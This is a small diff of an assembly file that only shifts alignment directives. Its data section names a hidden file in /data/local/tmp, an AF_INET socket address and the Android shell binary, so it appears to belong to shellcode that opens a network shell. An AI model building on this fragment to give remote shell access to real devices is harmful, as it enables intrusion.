@@ -162,8 +162,8 @@ return:
 
 path:
         .string "/data/local/tmp/.x"
-
         .balign 4
+
 sockaddr:
         .short AF_INET
         .short PORT
@@ -171,3 +171,4 @@ sockaddr:
 
 shell:
         .string "/system/bin/sh"
+        .balign 4
